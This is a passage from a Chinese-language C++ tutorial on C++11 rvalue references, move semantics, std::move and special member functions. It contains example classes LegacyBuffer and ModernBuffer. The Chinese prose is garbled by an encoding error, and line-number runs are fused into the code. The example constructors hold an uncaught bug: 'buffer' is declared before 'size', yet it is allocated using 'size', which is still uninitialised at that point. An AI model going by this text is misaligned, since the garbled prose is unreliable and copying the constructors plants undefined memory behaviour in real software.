&#123;&#125; è¿›è¡Œåˆ—è¡¨åˆå§‹åŒ–ã€‚ æ–°çš„ STL ç®—æ³•: å¢åŠ äº†ä¸€äº›æ–°çš„ç®—æ³•ï¼ˆå¦‚ copy_if, move, shuffle ç­‰ï¼‰ã€‚ Lambda è¡¨è¾¾å¼: ï¼ˆç¬¬ 16 ç« ç®€å•ä½¿ç”¨ï¼Œç¬¬ 18.4 èŠ‚è¯¦ç»†ä»‹ç»ï¼‰å…è®¸å°±åœ°å®šä¹‰åŒ¿åå‡½æ•°å¯¹è±¡ã€‚ æ¨¡æ¿åˆ«å (using): ï¼ˆç¬¬ 14 ç« ï¼‰æä¾›äº†æ¯” typedef æ›´æ¸…æ™°ã€æ›´å¼ºå¤§çš„ä¸ºæ¨¡æ¿å®šä¹‰åˆ«åçš„æ–¹å¼ã€‚ 12template&lt;typename T&gt;using Vec = std::vector&lt;T&gt;; // Vec&lt;int&gt; ç­‰ä»·äº std::vector&lt;int&gt; 18.1.9 å³å€¼å¼•ç”¨(æœ¬èŠ‚ä¸»è¦å›é¡¾ï¼Œä½†å³å€¼å¼•ç”¨å’Œç§»åŠ¨è¯­ä¹‰åœ¨ 18.2 è¯¦ç»†ä»‹ç»ï¼Œè¿™é‡Œä»…æåŠæ¦‚å¿µ)C++11 å¼•å…¥äº†ä¸€ä¸ªé‡è¦çš„åº•å±‚æ¦‚å¿µâ€”â€”å³å€¼å¼•ç”¨ (Rvalue Reference)**ï¼Œä½¿ç”¨ &amp;&amp; è¡¨ç¤ºã€‚å³å€¼å¼•ç”¨ä¸»è¦ç”¨äºå®ç°ç§»åŠ¨è¯­ä¹‰ (Move Semantics)** å’Œ**å®Œç¾è½¬å‘ (Perfect Forwarding)**ã€‚ç§»åŠ¨è¯­ä¹‰å…è®¸èµ„æºï¼ˆå¦‚åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼‰ä»ä¸€ä¸ªå¯¹è±¡â€œç§»åŠ¨â€åˆ°å¦ä¸€ä¸ªå¯¹è±¡ï¼Œè€Œä¸æ˜¯è¿›è¡Œæ˜‚è´µçš„å¤åˆ¶ï¼Œè¿™å¯¹äºä¼˜åŒ–æ¶‰åŠä¸´æ—¶å¯¹è±¡æˆ–èµ„æºè½¬ç§»çš„æ“ä½œè‡³å…³é‡è¦ï¼ˆä¾‹å¦‚ unique_ptr çš„æ‰€æœ‰æƒè½¬ç§»ï¼Œvector å¢é•¿æ—¶çš„å…ƒç´ ç§»åŠ¨ï¼‰ã€‚ç§»åŠ¨è¯­ä¹‰å°†åœ¨ 18.2 èŠ‚è¯¦ç»†æ¢è®¨ã€‚ è¿™äº› C++11 ç‰¹æ€§å…±åŒä½¿å¾— C++ ä»£ç å¯ä»¥å†™å¾—æ›´ç°ä»£ã€æ›´å®‰å…¨ã€æ›´é«˜æ•ˆã€‚ 18.2 ç§»åŠ¨è¯­ä¹‰å’Œå³å€¼å¼•ç”¨C++11 å¼•å…¥äº†å³å€¼å¼•ç”¨ (Rvalue Reference) å’Œ**ç§»åŠ¨è¯­ä¹‰ (Move Semantics)**ï¼Œè¿™æ˜¯ C++11 æœ€é‡è¦çš„ç‰¹æ€§ä¹‹ä¸€ï¼Œæ—¨åœ¨æé«˜æ€§èƒ½ï¼Œç‰¹åˆ«æ˜¯å¯¹äºç®¡ç†èµ„æºçš„ç±»ï¼ˆå¦‚åŠ¨æ€åˆ†é…å†…å­˜ã€æ–‡ä»¶å¥æŸ„ã€ç½‘ç»œè¿æ¥ç­‰ï¼‰ã€‚ 18.2.1 ä¸ºä½•éœ€è¦ç§»åŠ¨è¯­ä¹‰è€ƒè™‘ä¸€ä¸ªç®¡ç†åŠ¨æ€å†…å­˜çš„ç±»ï¼Œä¾‹å¦‚ä¸€ä¸ªç®€å•çš„å­—ç¬¦ä¸²ç±»æˆ–ä¸€ä¸ªæŒæœ‰å¤§ç¼“å†²åŒºçš„ç±»ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;iostream&gt;#include &lt;cstring&gt; // for strlen, strcpy#include &lt;utility&gt; // for std::swapclass LegacyBuffer &#123;private: char* buffer; size_t size;public: // Constructor LegacyBuffer(const char* s = &quot;&quot;) : size(std::strlen(s)), buffer(new char[size + 1]) &#123; std::cout &lt;&lt; &quot;Constructor called for &#x27;&quot; &lt;&lt; s &lt;&lt; &quot;&#x27;\\n&quot;; std::strcpy(buffer, s); &#125; // Destructor ~LegacyBuffer() &#123; std::cout &lt;&lt; &quot;Destructor called for buffer at &quot; &lt;&lt; (void*)buffer &lt;&lt; &quot;\\n&quot;; delete[] buffer; &#125; // Copy Constructor (Deep Copy) LegacyBuffer(const LegacyBuffer&amp; other) : size(other.size), buffer(new char[size + 1]) &#123; std::cout &lt;&lt; &quot;Copy Constructor called from &quot; &lt;&lt; (void*)other.buffer &lt;&lt; &quot; to &quot; &lt;&lt; (void*)buffer &lt;&lt; &quot;\\n&quot;; std::strcpy(buffer, other.buffer); &#125; // Copy Assignment Operator (Deep Copy) LegacyBuffer&amp; operator=(const LegacyBuffer&amp; other) &#123; std::cout &lt;&lt; &quot;Copy Assignment called from &quot; &lt;&lt; (void*)other.buffer &lt;&lt; &quot; to &quot; &lt;&lt; (void*)buffer &lt;&lt; &quot;\\n&quot;; if (this == &amp;other) &#123; // Self-assignment check return *this; &#125; delete[] buffer; // Release old resource size = other.size; buffer = new char[size + 1]; // Allocate new resource std::strcpy(buffer, other.buffer); // Copy data return *this; &#125; void print() const &#123; std::cout &lt;&lt; &quot;Buffer content: &quot; &lt;&lt; (buffer ? buffer : &quot;null&quot;) &lt;&lt; std::endl; &#125; friend void swap(LegacyBuffer&amp; first, LegacyBuffer&amp; second) noexcept &#123; using std::swap; swap(first.size, second.size); swap(first.buffer, second.buffer); std::cout &lt;&lt; &quot;Buffer swapped via friend swap\\n&quot;; &#125;&#125;;LegacyBuffer createBuffer(const char* s) &#123; return LegacyBuffer(s); // è¿”å›ä¸€ä¸ªä¸´æ—¶å¯¹è±¡ (rvalue)&#125; åœ¨ C++11 ä¹‹å‰ï¼Œå½“å¤„ç†ä¸´æ—¶å¯¹è±¡ (Temporary Objects) æˆ–å³å°†é”€æ¯çš„å¯¹è±¡æ—¶ï¼Œå¤åˆ¶æ„é€ å‡½æ•°å’Œå¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦ä¼šå¯¼è‡´ä¸å¿…è¦çš„**æ·±æ‹·è´ (Deep Copy)**ï¼š 12345678910111213141516171819202122232425int main() &#123; LegacyBuffer b1(&quot;Original&quot;); std::cout &lt;&lt; &quot;------\\n&quot;; LegacyBuffer b2 = b1; // è°ƒç”¨å¤åˆ¶æ„é€ å‡½æ•° (æ·±æ‹·è´) - åˆç†ï¼Œéœ€è¦ç‹¬ç«‹å‰¯æœ¬ std::cout &lt;&lt; &quot;------\\n&quot;; LegacyBuffer b3(&quot;Temporary Source&quot;); b1 = b3; // è°ƒç”¨å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦ (æ·±æ‹·è´) - åˆç† std::cout &lt;&lt; &quot;------\\n&quot;; // é—®é¢˜æ‰€åœ¨ï¼šå¤„ç†ä¸´æ—¶å¯¹è±¡ LegacyBuffer b4 = createBuffer(&quot;Temporary&quot;); // 1. createBuffer è¿”å›ä¸´æ—¶å¯¹è±¡ // 2. ä¸´æ—¶å¯¹è±¡è¢« *å¤åˆ¶* åˆ° b4 (è°ƒç”¨å¤åˆ¶æ„é€ å‡½æ•°) // 3. ä¸´æ—¶å¯¹è±¡è¢«é”€æ¯ // (ç¼–è¯‘å™¨ä¼˜åŒ– RVO/NRVO å¯èƒ½æ¶ˆé™¤è¿™æ¬¡å¤åˆ¶ï¼Œä½†æ¦‚å¿µä¸Šå­˜åœ¨) std::cout &lt;&lt; &quot;------\\n&quot;; b1 = createBuffer(&quot;Another Temp&quot;); // 1. createBuffer è¿”å›ä¸´æ—¶å¯¹è±¡ // 2. ä¸´æ—¶å¯¹è±¡è¢« *å¤åˆ¶* èµ‹å€¼ç»™ b1 (è°ƒç”¨å¤åˆ¶èµ‹å€¼) // 3. ä¸´æ—¶å¯¹è±¡è¢«é”€æ¯ std::cout &lt;&lt; &quot;------\\n&quot;; return 0;&#125; åœ¨å¤„ç† createBuffer è¿”å›çš„ä¸´æ—¶å¯¹è±¡æ—¶ï¼Œæˆ‘ä»¬å®é™…ä¸Šåªæ˜¯æƒ³æŠŠä¸´æ—¶å¯¹è±¡å†…éƒ¨ç®¡ç†çš„èµ„æºï¼ˆbuffer æŒ‡é’ˆå’Œ sizeï¼‰è½¬ç§»ç»™æ–°çš„å¯¹è±¡ (b4 æˆ– b1)ï¼Œå› ä¸ºä¸´æ—¶å¯¹è±¡é©¬ä¸Šå°±è¦è¢«é”€æ¯äº†ï¼Œå®ƒçš„èµ„æºæ²¡ç”¨äº†ã€‚è¿›è¡Œæ·±æ‹·è´ï¼ˆé‡æ–°åˆ†é…å†…å­˜å¹¶å¤åˆ¶å†…å®¹ï¼‰æ˜¯ä¸€ç§æµªè´¹ã€‚ ç§»åŠ¨è¯­ä¹‰å°±æ˜¯ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼šå…è®¸æˆ‘ä»¬â€œçªƒå–â€æˆ–â€œç§»åŠ¨â€æ¥è‡ªä¸´æ—¶å¯¹è±¡æˆ–æ˜ç¡®æ ‡è®°ä¸ºå¯ç§»åŠ¨å¯¹è±¡çš„èµ„æºï¼Œè€Œä¸æ˜¯å¤åˆ¶å®ƒä»¬ã€‚ å³å€¼å¼•ç”¨ (&amp;&amp;)ä¸ºäº†åŒºåˆ†å¯ä»¥å®‰å…¨â€œçªƒå–â€èµ„æºçš„ä¸´æ—¶å¯¹è±¡å’Œä¸èƒ½çªƒå–çš„æŒä¹…å¯¹è±¡ï¼ˆå·¦å€¼ï¼‰ï¼ŒC++11 å¼•å…¥äº†**å³å€¼å¼•ç”¨ (Rvalue Reference)**ï¼Œç”¨ &amp;&amp; è¡¨ç¤ºã€‚ å·¦å€¼ (Lvalue): é€šå¸¸æŒ‡é‚£äº›æœ‰åå­—ã€å¯ä»¥å–åœ°å€ã€åœ¨è¡¨è¾¾å¼ç»“æŸåä»ç„¶å­˜åœ¨çš„å¯¹è±¡ã€‚ä¾‹å¦‚ï¼Œå˜é‡å b1, b2ã€‚ å³å€¼ (Rvalue): é€šå¸¸æŒ‡é‚£äº›ä¸´æ—¶çš„ã€æ²¡æœ‰åå­—ã€åœ¨è¡¨è¾¾å¼ç»“æŸåå³å°†é”€æ¯çš„å€¼ã€‚ä¾‹å¦‚ï¼Œå‡½æ•°è¿”å›å€¼ createBuffer(&quot;Temporary&quot;)ï¼Œå­—é¢å¸¸é‡ 10, &quot;Hello&quot;ï¼Œç®—æœ¯è¡¨è¾¾å¼çš„ç»“æœ x + yã€‚ å·¦å€¼å¼•ç”¨ (&amp;): åªèƒ½ç»‘å®šåˆ°å·¦å€¼ã€‚LegacyBuffer&amp; ref = b1; (OK), LegacyBuffer&amp; ref = createBuffer(&quot;Temp&quot;); (é”™è¯¯!)ã€‚ (const å·¦å€¼å¼•ç”¨ const LegacyBuffer&amp; æ˜¯ä¸ªä¾‹å¤–ï¼Œå®ƒå¯ä»¥ç»‘å®šåˆ°å³å€¼)ã€‚ å³å€¼å¼•ç”¨ (&amp;&amp;): åªèƒ½ç»‘å®šåˆ°å³å€¼ã€‚LegacyBuffer&amp;&amp; rref = createBuffer(&quot;Temp&quot;); (OK), LegacyBuffer&amp;&amp; rref = b1; (é”™è¯¯!)ã€‚ å³å€¼å¼•ç”¨ &amp;&amp; çš„å¼•å…¥ä½¿å¾—æˆ‘ä»¬å¯ä»¥é‡è½½å‡½æ•°ï¼ˆç‰¹åˆ«æ˜¯æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦ï¼‰ï¼Œè®©å®ƒä»¬èƒ½å¤ŸåŒºåˆ†æ¥æ”¶çš„æ˜¯å·¦å€¼è¿˜æ˜¯å³å€¼ï¼Œä»è€Œå¯¹å³å€¼ï¼ˆä¸´æ—¶å¯¹è±¡ï¼‰é‡‡å–ä¸åŒçš„ã€æ›´é«˜æ•ˆçš„æ“ä½œï¼ˆç§»åŠ¨ï¼‰ã€‚ 18.2.2 ä¸€ä¸ªç§»åŠ¨ç¤ºä¾‹ç°åœ¨æˆ‘ä»¬ä¸º LegacyBuffer ç±»æ·»åŠ ç§»åŠ¨æ„é€ å‡½æ•°å’Œç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;utility&gt; // for std::move and std::swapclass ModernBuffer &#123;private: char* buffer; size_t size;public: // Constructor ModernBuffer(const char* s = &quot;&quot;) : size(std::strlen(s)), buffer(new char[size + 1]) &#123; std::cout &lt;&lt; &quot;Constructor called for &#x27;&quot; &lt;&lt; s &lt;&lt; &quot;&#x27;\\n&quot;; std::strcpy(buffer, s); &#125; // Destructor ~ModernBuffer() &#123; std::cout &lt;&lt; &quot;Destructor called for buffer at &quot; &lt;&lt; (void*)buffer &lt;&lt; &quot;\\n&quot;; delete[] buffer; &#125; // Copy Constructor (Deep Copy) ModernBuffer(const ModernBuffer&amp; other) : size(other.size), buffer(new char[size + 1]) &#123; std::cout &lt;&lt; &quot;Copy Constructor called from &quot; &lt;&lt; (void*)other.buffer &lt;&lt; &quot; to &quot; &lt;&lt; (void*)buffer &lt;&lt; &quot;\\n&quot;; std::strcpy(buffer, other.buffer); &#125; // Copy Assignment Operator (Deep Copy) ModernBuffer&amp; operator=(const ModernBuffer&amp; other) &#123; std::cout &lt;&lt; &quot;Copy Assignment called from &quot; &lt;&lt; (void*)other.buffer &lt;&lt; &quot; to &quot; &lt;&lt; (void*)buffer &lt;&lt; &quot;\\n&quot;; if (this == &amp;other) &#123; return *this; &#125; // ä½¿ç”¨ copy-and-swap idiom æ›´å®‰å…¨ ModernBuffer temp(other); // è°ƒç”¨å¤åˆ¶æ„é€  swap(*this, temp); // äº¤æ¢èµ„æº return *this; // æ—§æ–¹å¼ï¼š // delete[] buffer; // size = other.size; // buffer = new char[size + 1]; // std::strcpy(buffer, other.buffer); // return *this; &#125; // *** Move Constructor (C++11) *** ModernBuffer(ModernBuffer&amp;&amp; other) noexcept // æ¥æ”¶å³å€¼å¼•ç”¨ï¼Œæ ‡è®°ä¸º noexcept : size(other.size), buffer(other.buffer) // 1. çªƒå–èµ„æº (æµ…æ‹·è´æŒ‡é’ˆå’Œå¤§å°) &#123; std::cout &lt;&lt; &quot;Move Constructor called from &quot; &lt;&lt; (void*)other.buffer &lt;&lt; &quot; to &quot; &lt;&lt; (void*)buffer &lt;&lt; &quot;\\n&quot;; // 2. å°†æºå¯¹è±¡ç½®äºæœ‰æ•ˆä½†å¯ææ„çš„çŠ¶æ€ (é€šå¸¸æ˜¯ç½®ç©º) other.size = 0; other.buffer = nullptr; &#125; // *** Move Assignment Operator (C++11) *** ModernBuffer&amp; operator=(ModernBuffer&amp;&amp; other) noexcept // æ¥æ”¶å³å€¼å¼•ç”¨ï¼Œæ ‡è®°ä¸º noexcept &#123; std::cout &lt;&lt; &quot;Move Assignment called from &quot; &lt;&lt; (void*)other.buffer &lt;&lt; &quot; to &quot; &lt;&lt; (void*)buffer &lt;&lt; &quot;\\n&quot;; if (this == &amp;other) &#123; // è‡ªèµ‹å€¼æ£€æŸ¥ (è™½ç„¶å¯¹å³å€¼ä¸å¤ªå¯èƒ½ï¼Œä½†ä¿æŒè‰¯å¥½ä¹ æƒ¯) return *this; &#125; // 1. é‡Šæ”¾å½“å‰å¯¹è±¡çš„èµ„æº delete[] buffer; // 2. çªƒå–æºå¯¹è±¡çš„èµ„æº size = other.size; buffer = other.buffer; // 3. å°†æºå¯¹è±¡ç½®äºæœ‰æ•ˆä½†å¯ææ„çš„çŠ¶æ€ other.size = 0; other.buffer = nullptr; return *this; // æˆ–è€…ä½¿ç”¨ swap: // swap(*this, other); // return *this; &#125; void print() const &#123; std::cout &lt;&lt; &quot;Buffer content: &quot; &lt;&lt; (buffer ? buffer : &quot;null&quot;) &lt;&lt; std::endl; &#125; friend void swap(ModernBuffer&amp; first, ModernBuffer&amp; second) noexcept &#123; using std::swap; swap(first.size, second.size); swap(first.buffer, second.buffer); std::cout &lt;&lt; &quot;Buffer swapped via friend swap\\n&quot;; &#125;&#125;;ModernBuffer createModernBuffer(const char* s) &#123; return ModernBuffer(s); // è¿”å›ä¸´æ—¶å¯¹è±¡ (rvalue)&#125;int main() &#123; ModernBuffer mb1(&quot;Original&quot;); std::cout &lt;&lt; &quot;------\\n&quot;; // è°ƒç”¨ç§»åŠ¨æ„é€ å‡½æ•° (å› ä¸º createModernBuffer è¿”å›å³å€¼) ModernBuffer mb2 = createModernBuffer(&quot;Temporary&quot;); std::cout &lt;&lt; &quot;------\\n&quot;; mb2.print(); std::cout &lt;&lt; &quot;------\\n&quot;; // è°ƒç”¨ç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦ (å› ä¸º createModernBuffer è¿”å›å³å€¼) mb1 = createModernBuffer(&quot;Another Temp&quot;); std::cout &lt;&lt; &quot;------\\n&quot;; mb1.print(); std::cout &lt;&lt; &quot;------\\n&quot;; return 0;&#125; ç°åœ¨ï¼Œå½“ç”¨ createModernBuffer è¿”å›çš„ä¸´æ—¶å¯¹è±¡æ¥åˆå§‹åŒ– mb2 æˆ–èµ‹å€¼ç»™ mb1 æ—¶ï¼Œä¼šè°ƒç”¨ç§»åŠ¨æ„é€ å‡½æ•°æˆ–ç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦ã€‚è¿™äº›æ“ä½œä¸å†è¿›è¡Œæ·±æ‹·è´ï¼Œè€Œæ˜¯ç›´æ¥â€œçªƒå–â€ä¸´æ—¶å¯¹è±¡çš„ buffer æŒ‡é’ˆï¼Œå¹¶å°†ä¸´æ—¶å¯¹è±¡çš„æŒ‡é’ˆç½®ä¸º nullptrï¼Œé¿å…äº†å†…å­˜åˆ†é…å’Œæ•°æ®å¤åˆ¶ï¼Œæ•ˆç‡å¤§å¤§æé«˜ã€‚ 18.2.3 ç§»åŠ¨æ„é€ å‡½æ•°è§£æ1234567ModernBuffer(ModernBuffer&amp;&amp; other) noexcept : size(other.size), buffer(other.buffer) // 1. çªƒå–èµ„æº&#123; // 2. å°†æºå¯¹è±¡ç½®ç©º other.size = 0; other.buffer = nullptr;&#125; å‚æ•°ç±»å‹ ModernBuffer&amp;&amp; other: æ¥æ”¶ä¸€ä¸ªå³å€¼å¼•ç”¨ï¼Œè¡¨ç¤ºå®ƒåªèƒ½ç»‘å®šåˆ°å³å€¼ï¼ˆå¦‚ä¸´æ—¶å¯¹è±¡ï¼‰ã€‚ èµ„æºçªƒå–: æ„é€ å‡½æ•°é€šè¿‡åˆå§‹åŒ–åˆ—è¡¨ç›´æ¥å¤åˆ¶æºå¯¹è±¡ other çš„æŒ‡é’ˆ buffer å’Œå¤§å° sizeã€‚è¿™æ˜¯ä¸€ä¸ªæµ…æ‹·è´ï¼Œéå¸¸å¿«é€Ÿã€‚ ç½®ç©ºæºå¯¹è±¡: å…³é”®æ­¥éª¤ï¼ å¿…é¡»å°†æºå¯¹è±¡ other çš„æŒ‡é’ˆæˆå‘˜ï¼ˆbufferï¼‰è®¾ç½®ä¸º nullptrï¼ˆæˆ–å…¶ä»–æœ‰æ•ˆä½†è¡¨ç¤ºâ€œç©ºâ€çŠ¶æ€çš„å€¼ï¼‰ã€‚è¿™ç¡®ä¿äº†å½“ otherï¼ˆä¸´æ—¶å¯¹è±¡ï¼‰éšåè¢«ææ„æ—¶ï¼Œå®ƒçš„ææ„å‡½æ•° delete[] buffer; ä¸ä¼šé‡Šæ”¾å·²ç»è¢«æ–°å¯¹è±¡â€œçªƒå–â€èµ°çš„å†…å­˜ï¼Œä»è€Œé¿å…äº†é‡å¤é‡Šæ”¾ (double free) çš„é”™è¯¯ã€‚æºå¯¹è±¡å¿…é¡»è¢«ç½®äºä¸€ä¸ªæœ‰æ•ˆçš„ã€å¯ææ„çš„çŠ¶æ€ã€‚ noexcept: ç§»åŠ¨æ“ä½œé€šå¸¸ä¸åº”è¯¥æŠ›å‡ºå¼‚å¸¸ï¼ˆå› ä¸ºå®ƒä»¬ä¸»è¦æ¶‰åŠæŒ‡é’ˆå’ŒåŸºæœ¬ç±»å‹çš„èµ‹å€¼ï¼‰ã€‚å°†ç§»åŠ¨æ„é€ å‡½æ•°å’Œç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦æ ‡è®°ä¸º noexcept éå¸¸é‡è¦ã€‚è¿™å…è®¸ STL å®¹å™¨ç­‰åœ¨éœ€è¦é‡æ–°åˆ†é…å†…å­˜æ—¶ï¼ˆå¦‚ vector å¢é•¿ï¼‰å®‰å…¨åœ°ç§»åŠ¨å…ƒç´ è€Œä¸æ˜¯å¤åˆ¶å®ƒä»¬ï¼Œä»è€Œè·å¾—æ˜¾è‘—çš„æ€§èƒ½æå‡ã€‚å¦‚æœç§»åŠ¨æ“ä½œå¯èƒ½æŠ›å¼‚å¸¸ï¼ŒSTL é€šå¸¸ä¼šå›é€€åˆ°ä½¿ç”¨ï¼ˆä¿è¯å¼‚å¸¸å®‰å…¨çš„ï¼‰å¤åˆ¶æ“ä½œã€‚ 18.2.4 èµ‹å€¼ç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦çš„é€»è¾‘ä¸ç§»åŠ¨æ„é€ å‡½æ•°ç±»ä¼¼ï¼š 123456789101112ModernBuffer&amp; operator=(ModernBuffer&amp;&amp; other) noexcept &#123; // ... è‡ªèµ‹å€¼æ£€æŸ¥ ... // 1. é‡Šæ”¾å½“å‰èµ„æº delete[] buffer; // 2. çªƒå–æºèµ„æº size = other.size; buffer = other.buffer; // 3. ç½®ç©ºæºå¯¹è±¡ other.size = 0; other.buffer = nullptr; return *this;&#125; å®ƒé¦–å…ˆé‡Šæ”¾è‡ªå·±å½“å‰æŒæœ‰çš„èµ„æºï¼Œç„¶åçªƒå–æºå¯¹è±¡çš„èµ„æºï¼Œæœ€åå°†æºå¯¹è±¡ç½®ç©ºã€‚ä½¿ç”¨ swap å®ç°é€šå¸¸æ›´ç®€æ´ä¸”èƒ½è‡ªåŠ¨å¤„ç†è‡ªèµ‹å€¼å’Œå¼‚å¸¸å®‰å…¨ï¼ˆå¦‚æœ swap æ˜¯ noexcept çš„è¯ï¼‰ã€‚ 18.2.5 å¼ºåˆ¶ç§»åŠ¨ (std::move)ç§»åŠ¨æ„é€ å‡½æ•°å’Œç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦é€šå¸¸åªå¯¹å³å€¼ï¼ˆå¦‚ä¸´æ—¶å¯¹è±¡ï¼‰èµ·ä½œç”¨ã€‚ä½†æœ‰æ—¶æˆ‘ä»¬æƒ³ä»ä¸€ä¸ªå·¦å€¼ï¼ˆæœ‰åå­—çš„å¯¹è±¡ï¼‰é‚£é‡Œâ€œçªƒå–â€èµ„æºï¼Œå³ä½¿è¿™ä¸ªå·¦å€¼åœ¨ä¹‹åè¿˜ä¼šå­˜åœ¨ï¼ˆä½†æˆ‘ä»¬æ˜ç¡®çŸ¥é“ä¸å†éœ€è¦å®ƒçš„èµ„æºäº†ï¼‰ã€‚ ä¾‹å¦‚ï¼Œå°†ä¸€ä¸ªå¤§çš„ vector çš„å†…å®¹è½¬ç§»ç»™å¦ä¸€ä¸ª vectorï¼š 123456789101112std::vector&lt;int&gt; source = &#123;1, 2, 3, 4, 5&#125;;std::vector&lt;int&gt; destination;// destination = source; // è¿™ä¼šè°ƒç”¨å¤åˆ¶èµ‹å€¼ï¼Œå¤åˆ¶æ‰€æœ‰å…ƒç´ // æˆ‘ä»¬æƒ³ç§»åŠ¨ source çš„å†…å®¹åˆ° destinationï¼Œå³ä½¿ source æ˜¯å·¦å€¼// ä½¿ç”¨ std::move() å°† source å¼ºåˆ¶è½¬æ¢ä¸ºå³å€¼å¼•ç”¨ç±»å‹destination = std::move(source);// ç°åœ¨ï¼Œdestination æ‹¥æœ‰äº†åŸæ¥çš„å…ƒç´  &#123;1, 2, 3, 4, 5&#125;// source çš„çŠ¶æ€æ˜¯æœ‰æ•ˆçš„ï¼Œä½†å†…å®¹æœªæŒ‡å®š (é€šå¸¸ä¸ºç©º)std::cout &lt;&lt; &quot;Source size after move: &quot; &lt;&lt; source.size() &lt;&lt; std::endl; // é€šå¸¸è¾“å‡º 0 std::move (å®šä¹‰åœ¨ &lt;utility&gt;) æœ¬èº«å¹¶ä¸æ‰§è¡Œä»»ä½•ç§»åŠ¨æ“ä½œã€‚å®ƒåªæ˜¯ä¸€ä¸ªç±»å‹è½¬æ¢ï¼Œå®ƒæ— æ¡ä»¶åœ°å°†å…¶å®å‚ï¼ˆæ— è®ºæ˜¯å·¦å€¼è¿˜æ˜¯å³å€¼ï¼‰è½¬æ¢ä¸ºå³å€¼å¼•ç”¨ç±»å‹ (T&amp;&amp;)ã€‚ è¿™ä¸ªè½¬æ¢ä½¿å¾—è¢«è½¬æ¢çš„å¯¹è±¡å¯ä»¥è¢«ç»‘å®šåˆ°æ¥å—å³å€¼å¼•ç”¨çš„å‡½æ•°ï¼ˆå¦‚ç§»åŠ¨æ„é€ å‡½æ•°æˆ–ç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦ï¼‰ï¼Œä»è€Œè§¦å‘ç§»åŠ¨è¯­ä¹‰ã€‚ ä½¿ç”¨ std::move çš„æ³¨æ„äº‹é¡¹: è°ƒç”¨ std::move(x) åï¼Œä½ ä¸åº”è¯¥å†å¯¹ x çš„å€¼åšä»»ä½•å‡è®¾ï¼ˆé™¤äº†å®ƒå¯ä»¥è¢«å®‰å…¨åœ°é”€æ¯æˆ–é‡æ–°èµ‹å€¼ï¼‰ã€‚å®ƒçš„èµ„æºå¯èƒ½å·²ç»è¢«â€œå·èµ°â€äº†ã€‚ åªåœ¨ä½ ç¡®å®šä¸å†éœ€è¦æºå¯¹è±¡ï¼ˆå·¦å€¼ï¼‰çš„èµ„æºï¼Œæˆ–è€…æºå¯¹è±¡æœ¬èº«å°±æ˜¯ä¸´æ—¶çš„ï¼ˆè™½ç„¶å¯¹ä¸´æ—¶å¯¹è±¡ç”¨ std::move é€šå¸¸æ˜¯å¤šä½™çš„ï¼‰æ—¶ï¼Œæ‰ä½¿ç”¨ std::moveã€‚ ç§»åŠ¨è¯­ä¹‰å’Œå³å€¼å¼•ç”¨æ˜¯ C++11 ä¸­å®ç°èµ„æºé«˜æ•ˆè½¬ç§»çš„å…³é”®æœºåˆ¶ï¼Œå¯¹äºç¼–å†™é«˜æ€§èƒ½çš„ C++ ä»£ç è‡³å…³é‡è¦ï¼Œå°¤å…¶æ˜¯åœ¨å¤„ç†å¤§å‹æ•°æ®ç»“æ„æˆ–ç®¡ç†ç³»ç»Ÿèµ„æºæ—¶ã€‚ 18.3 æ–°çš„ç±»åŠŸèƒ½C++11 ä¸ä»…å¼•å…¥äº†ç§»åŠ¨è¯­ä¹‰ï¼Œè¿˜å¯¹ç±»çš„å®šä¹‰å’Œä½¿ç”¨æ–¹å¼è¿›è¡Œäº†ä¸€äº›é‡è¦çš„å¢å¼ºï¼Œä½¿å¾—ç±»çš„è®¾è®¡æ›´åŠ çµæ´»å’Œå¯æ§ã€‚ 18.3.1 ç‰¹æ®Šçš„æˆå‘˜å‡½æ•°å¯¹äºä¸€ä¸ªç±»ï¼Œç¼–è¯‘å™¨åœ¨ç‰¹å®šæ¡ä»¶ä¸‹å¯ä»¥è‡ªåŠ¨ç”Ÿæˆä¸€äº›ç‰¹æ®Šçš„æˆå‘˜å‡½æ•°ï¼š é»˜è®¤æ„é€ å‡½æ•° (Default Constructor): å¦‚æœä½ æ²¡æœ‰æä¾›ä»»ä½•æ„é€ å‡½æ•°ï¼Œç¼–è¯‘å™¨ä¼šç”Ÿæˆä¸€ä¸ªã€‚ ææ„å‡½æ•° (Destructor): å¦‚æœä½ æ²¡æœ‰æä¾›ææ„å‡½æ•°ï¼Œç¼–è¯‘å™¨ä¼šç”Ÿæˆä¸€ä¸ªã€‚ å¤åˆ¶æ„é€ å‡½æ•° (Copy Constructor): å¦‚æœä½ æ²¡æœ‰æä¾›å¤åˆ¶æ„é€ å‡½æ•°ï¼Œç¼–è¯‘å™¨ä¼šç”Ÿæˆä¸€ä¸ªï¼Œæ‰§è¡Œé€æˆå‘˜å¤åˆ¶ã€‚ å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦ (Copy Assignment Operator): å¦‚æœä½ æ²¡æœ‰æä¾›å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦ï¼Œç¼–è¯‘å™¨ä¼šç”Ÿæˆä¸€ä¸ªï¼Œæ‰§è¡Œé€æˆå‘˜èµ‹å€¼ã€‚ ç§»åŠ¨æ„é€ å‡½æ•° (Move Constructor) (C++11): ä»…å½“æ²¡æœ‰æ˜¾å¼å£°æ˜ä»»ä½•å¤åˆ¶æ“ä½œï¼ˆå¤åˆ¶æ„é€ ã€å¤åˆ¶èµ‹å€¼ï¼‰ä¸”æ²¡æœ‰æ˜¾å¼å£°æ˜ç§»åŠ¨æ“ä½œï¼ˆç§»åŠ¨æ„é€ ã€ç§»åŠ¨èµ‹å€¼ï¼‰ä¸”æ²¡æœ‰æ˜¾å¼å£°æ˜ææ„å‡½æ•°æ—¶ï¼Œç¼–è¯‘å™¨æ‰ä¼šç”Ÿæˆã€‚å®ƒæ‰§è¡Œé€æˆå‘˜ç§»åŠ¨ã€‚ 